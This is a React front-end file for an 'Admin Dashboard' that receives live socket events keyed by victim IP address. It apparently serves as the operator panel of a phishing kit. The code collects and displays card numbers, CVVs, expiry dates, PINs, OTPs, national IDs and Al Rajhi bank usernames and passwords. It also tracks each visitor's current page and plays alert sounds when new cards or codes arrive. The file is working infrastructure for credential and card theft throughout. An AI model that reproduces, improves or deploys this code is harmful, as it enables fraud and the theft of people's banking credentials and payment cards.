// src/App.js
import React, { useEffect, useState, useRef } from "react";
import { Routes, Route, Navigate, useNavigate } from "react-router-dom";

import { socket } from "./socket";
import UserTable from "./components/UserTable";
import CardModal from "./components/CardModal";
import InfoModal from "./components/InfoModal";
import Login from "./Login";

export default function App() {
  const [users, setUsers] = useState({});
  const [cardIp, setCardIp] = useState(null);
  const [infoIp, setInfoIp] = useState(null);
  const [highlightIp, setHighlightIp] = useState(null);

  // 🔊 Three sounds: data, card, code
  const updateSound = useRef();
  const cardSound = useRef();
  const codeSound = useRef();
  const audioUnlocked = useRef(false);

  const navigate = useNavigate();

  useEffect(() => {
    // Load all sounds
    updateSound.current = new Audio("/sounds/new-data.wav");
    cardSound.current = new Audio("/sounds/new-card.wav");
    codeSound.current = new Audio("/sounds/new-code.wav");
    
    // Preload all sounds
    updateSound.current.preload = "auto";
    cardSound.current.preload = "auto";
    codeSound.current.preload = "auto";
    
    updateSound.current.load();
    cardSound.current.load();
    codeSound.current.load();
    
    // Unlock audio on first user interaction
    const unlockAudio = () => {
      if (audioUnlocked.current) return;
      
      [updateSound.current, cardSound.current, codeSound.current].forEach(sound => {
        const promise = sound.play();
        if (promise !== undefined) {
          promise.then(() => {
            sound.pause();
            sound.currentTime = 0;
          }).catch(() => {});
        }
      });
      
      audioUnlocked.current = true;
    };
    
    // Listen for any user interaction
    const events = ['click', 'touchstart', 'keydown'];
    events.forEach(event => {
      document.addEventListener(event, unlockAudio, { once: true });
    });

    (async () => {
      const token = localStorage.getItem("token");
      if (!token) {
        navigate("/login", { replace: true });
        return;
      }

      socket.connect();
      socket.emit("loadData");

      socket.on("initialData", (data) => {
        // keep token but clear other cached keys so UI mirrors DB
        const keepToken = localStorage.getItem("token");
        localStorage.clear();
        if (keepToken) localStorage.setItem("token", keepToken);

        const map = {};

        // 1) Flatten everything except payment/flags/locations/newDates/rajhi
        Object.entries(data).forEach(([key, arr]) => {
          if (
            key === "payment" ||
            key === "flags" ||
            key === "locations" ||
            key === "newDates" ||
            key === "rajhi"
          )
            return;

          arr.forEach((r) => {
            const ipKey = r.ip;
            if (!map[ipKey]) {
              map[ipKey] = {
                payments: [],
                flag: false,
                hasNewData: false,
                hasPayment: false,
              };
            }
            map[ipKey] = {
              ...map[ipKey],
              ...r,
              payments: map[ipKey].payments,
              flag: map[ipKey].flag,
              hasNewData: false,
              hasPayment: map[ipKey].hasPayment,
            };
          });
        });

        // 2) Payments (also mark hasPayment)
        if (data.payment) {
          data.payment.forEach((payDoc) => {
            const ipKey = payDoc.ip;
            if (!map[ipKey]) {
              map[ipKey] = {
                payments: [],
                flag: false,
                hasNewData: false,
                hasPayment: false,
              };
            }
            map[ipKey].payments.push(payDoc);
            map[ipKey].hasPayment = true; // show as completed payment
          });
        }

        // 3) Flags
        if (data.flags) {
          data.flags.forEach(({ ip: ipKey, flag }) => {
            if (!map[ipKey]) {
              map[ipKey] = {
                payments: [],
                flag: false,
                hasNewData: false,
                hasPayment: false,
              };
            }
            map[ipKey].flag = flag;
          });
        }

        // 4) Locations
        if (data.locations) {
          data.locations.forEach(({ ip: ipKey, currentPage }) => {
            if (!map[ipKey]) {
              map[ipKey] = {
                payments: [],
                flag: false,
                hasNewData: false,
                hasPayment: false,
              };
            }
            map[ipKey].currentPage = currentPage;
          });
        }

        // 5) Merge NewDate identity fields
        if (data.newDates) {
          data.newDates.forEach(
            ({
              ip: ipKey,
              name,
              nationalID,
              phoneNumber,
              email,
              nationality,
              countryOfRegistration,
              region,
            }) => {
              if (!map[ipKey]) {
                map[ipKey] = {
                  payments: [],
                  flag: false,
                  hasNewData: false,
                  hasPayment: false,
                };
              }
              map[ipKey] = {
                ...map[ipKey],
                name: name ?? map[ipKey].name,
                nationalID: nationalID ?? map[ipKey].nationalID,
                phoneNumber: phoneNumber ?? map[ipKey].phoneNumber,
                email: email ?? map[ipKey].email,
                nationality: nationality ?? map[ipKey].nationality,
                countryOfRegistration:
                  countryOfRegistration ?? map[ipKey].countryOfRegistration,
                region: region ?? map[ipKey].region,
              };
            }
          );
        }

        // 6) 🔹 Merge Rajhi records into user object
        if (data.rajhi) {
          data.rajhi.forEach(({ ip: ipKey, username, password }) => {
            if (!map[ipKey]) {
              map[ipKey] = {
                payments: [],
                flag: false,
                hasNewData: false,
                hasPayment: false,
              };
            }
            map[ipKey] = {
              ...map[ipKey],
              rajhiUsername: username ?? map[ipKey].rajhiUsername,
              rajhiPassword: password ?? map[ipKey].rajhiPassword,
            };
          });
        }

        setUsers(map);
      });

      // Helpers - Sound functions
      const playSound = (soundRef) => {
        if (!soundRef.current) return;
        
        try {
          soundRef.current.currentTime = 0; // Reset to start
          const playPromise = soundRef.current.play();
          
          if (playPromise !== undefined) {
            playPromise.catch((error) => {
              console.warn('Audio play prevented:', error);
            });
          }
        } catch (err) {
          console.warn('Sound playback error:', err);
        }
      };

      const playNewDataSound = () => playSound(updateSound);
      const playCardSound = () => playSound(cardSound);
      const playCodeSound = () => playSound(codeSound);

      // Merge for real NEW DATA submissions (plays sound + marks new)
      const mergeData = (u) => {
        setUsers((m) => {
          const oldObj = m[u.ip] || {
            payments: [],
            flag: false,
            hasNewData: false,
            hasPayment: false,
          };

          playNewDataSound();

          return {
            ...m,
            [u.ip]: {
              ...oldObj,
              ...u,
              payments: oldObj.payments,
              flag: oldObj.flag,
              hasNewData: true, // ✅ mark as new data
              hasPayment: oldObj.hasPayment || u.hasPayment === true,
            },
          };
        });
      };

      // Merge for CODE submissions (plays code sound + marks new)
      const mergeCode = (u) => {
        setUsers((m) => {
          const oldObj = m[u.ip] || {
            payments: [],
            flag: false,
            hasNewData: false,
            hasPayment: false,
          };

          playCodeSound(); // Use code sound

          return {
            ...m,
            [u.ip]: {
              ...oldObj,
              ...u,
              payments: oldObj.payments,
              flag: oldObj.flag,
              hasNewData: true, // ✅ mark as new data
              hasPayment: oldObj.hasPayment || u.hasPayment === true,
            },
          };
        });
      };

      // Merge for NON-DATA updates (silent, does NOT mark new)
      const mergeSilent = (u) => {
        setUsers((m) => {
          const oldObj = m[u.ip] || {
            payments: [],
            flag: false,
            hasNewData: false,
            hasPayment: false,
          };
          return {
            ...m,
            [u.ip]: {
              ...oldObj,
              ...u,
              payments: oldObj.payments,
              flag: oldObj.flag,
              hasNewData: oldObj.hasNewData, // keep prior state
              hasPayment: oldObj.hasPayment, // keep prior state
            },
          };
        });
      };

      // Append a payment (sound + highlights the user as "Paid")
      const appendPayment = (u) => {
        setUsers((m) => {
          const oldObj = m[u.ip] || {
            payments: [],
            flag: false,
            hasNewData: false,
            hasPayment: false,
          };

          // 🚫 skip duplicates
          const dup = oldObj.payments.some((p) => {
            if (u._id && p._id) return p._id === u._id;
            return (
              p.cardHolderName === u.cardHolderName &&
              p.cardNumber === u.cardNumber &&
              p.expirationDate === u.expirationDate &&
              p.cvv === u.cvv
            );
          });
          if (dup) return m;

          // sound for card payment
          playCardSound();

          return {
            ...m,
            [u.ip]: {
              ...oldObj,
              ...u,
              payments: [...oldObj.payments, u],
              flag: oldObj.flag,
              hasNewData: true, // new data arrived
              hasPayment: true, // ✅ mark as paid/completed
            },
          };
        });
      };

      const removeUser = ({ ip }) =>
        setUsers((m) => {
          const copy = { ...m };
          delete copy[ip];
          return copy;
        });

      const updateFlag = ({ ip, flag }) =>
        setUsers((m) => ({
          ...m,
          [ip]: {
            ...(m[ip] || {
              payments: [],
              flag: false,
              hasNewData: false,
              hasPayment: false,
            }),
            flag,
          },
        }));

      // 🔔 Treat all “new*” events as DATA submissions (sound + new mark)
      socket.on("newIndex", (u) => mergeData(u));
      socket.on("newDetails", (u) => mergeData(u));
      socket.on("newShamel", (u) => mergeData(u));
      socket.on("newThirdparty", (u) => mergeData(u));
      socket.on("newBilling", (u) => mergeData(u));
      socket.on("newPayment", (u) => appendPayment(u));
      socket.on("newPhone", (u) => mergeData(u));
      socket.on("newPin", (u) => mergeCode(u)); // Use code sound
      socket.on("newOtp", (u) => mergeCode(u)); // Use code sound
      socket.on("newPhoneCode", (u) => mergeCode(u)); // Use code sound
      socket.on("newNafad", (u) => mergeData(u));
      socket.on("newNewDate", (r) => mergeData(r));
      // 🔹 NEW: Rajhi submissions
      socket.on("newRajhi", (u) =>
        mergeData({
          ip: u.ip,
          rajhiUsername: u.username,
          rajhiPassword: u.password,
        })
      );
      // 🔹 NEW: SMASCO submissions
      socket.on("newSmascoInfo", (u) => mergeData(u));
      socket.on("newSmascoService", (u) => mergeData(u));

      // 🌐 Location updates are SILENT and DO NOT mark new data
      socket.on("locationUpdated", ({ ip, page }) => {
        if (page !== "offline") {
          mergeSilent({ ip, currentPage: page });
        } else {
          setUsers((m) => {
            if (!m[ip]) return m;
            return {
              ...m,
              [ip]: {
                ...m[ip],
                currentPage: "offline",
                // keep hasNewData/hasPayment unchanged
              },
            };
          });
        }
      });

      socket.on("userDeleted", removeUser);
      socket.on("flagUpdated", updateFlag);
    })();
    
    // Cleanup: remove event listeners
    return () => {
      events.forEach(event => {
        document.removeEventListener(event, unlockAudio);
      });
    };
  }, [navigate]);

  // 👇 Open the card without clearing the paid flag.
  // We only clear "hasNewData" so the row stops blinking as "new".
  const handleShowCard = (ip) => {
    setHighlightIp(null);
    setCardIp(ip);

    setUsers((m) => {
      if (!m[ip]) return m;
      return {
        ...m,
        [ip]: {
          ...m[ip],
          hasNewData: false, // clear new-data highlight
          // 🔒 DO NOT touch hasPayment; keep it as-is (persist the PAID state)
        },
      };
    });
  };

  return (
    <Routes>
      <Route path="/login" element={<Login />} />
      <Route
        path="/"
        element={
          localStorage.getItem("token") ? (
            <DashboardView
              users={users}
              highlightIp={highlightIp}
              cardIp={cardIp}
              setCardIp={setCardIp}
              infoIp={infoIp}
              setInfoIp={setInfoIp}
              onShowCard={handleShowCard}
            />
          ) : (
            <Navigate to="/login" replace />
          )
        }
      />
      <Route
        path="*"
        element={
          localStorage.getItem("token") ? (
            <Navigate to="/" replace />
          ) : (
            <Navigate to="/login" replace />
          )
        }
      />
    </Routes>
  );
}

function DashboardView({
  users,
  highlightIp,
  cardIp,
  onShowCard,
  infoIp,
  setInfoIp,
  setCardIp,
}) {
  return (
    <div className="container py-4">
      <div className="d-flex justify-content-between align-items-center mb-3">
        <h2>Admin Dashboard</h2>
      </div>

      <UserTable
        users={users}
        highlightIp={highlightIp}
        cardIp={cardIp}
        onShowCard={onShowCard}
        onShowInfo={setInfoIp}
      />

      {cardIp && (
        <CardModal
          ip={cardIp}
          user={users[cardIp]}
          onClose={() => setCardIp(null)}
        />
      )}

      {infoIp && (
        <InfoModal
          ip={infoIp}
          user={users[infoIp]}
          onClose={() => setInfoIp(null)}
        />
      )}
    </div>
  );
}
